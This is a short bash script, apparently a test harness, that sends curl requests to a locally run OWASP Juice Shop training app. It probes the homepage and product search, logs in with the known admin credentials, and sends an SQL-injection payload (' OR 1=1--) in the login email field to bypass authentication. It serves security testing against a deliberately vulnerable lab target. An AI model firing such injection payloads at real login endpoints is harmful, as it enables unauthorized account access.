#!/usr/bin/env bash
set -euo pipefail

BASE_URL="${JUICE_SHOP_BASE_URL:-http://127.0.0.1:3002}"

echo "[karaxys] GET /"
curl -sS -i --max-time 15 "${BASE_URL}/"
echo

echo "[karaxys] GET /rest/products/search"
curl -sS -i --max-time 15 "${BASE_URL}/rest/products/search?q=apple"
echo

echo "[karaxys] POST /rest/user/login normal credentials"
curl -sS -i --max-time 15 \
  -H 'Content-Type: application/json' \
  -d '{"email":"admin@juice-sh.op","password":"admin123"}' \
  "${BASE_URL}/rest/user/login" || true
echo

echo "[karaxys] POST /rest/user/login SQLi-style credentials"
curl -sS -i --max-time 15 \
  -H 'Content-Type: application/json' \
  -d "{\"email\":\"' OR 1=1--\",\"password\":\"karaxys\"}" \
  "${BASE_URL}/rest/user/login" || true
echo
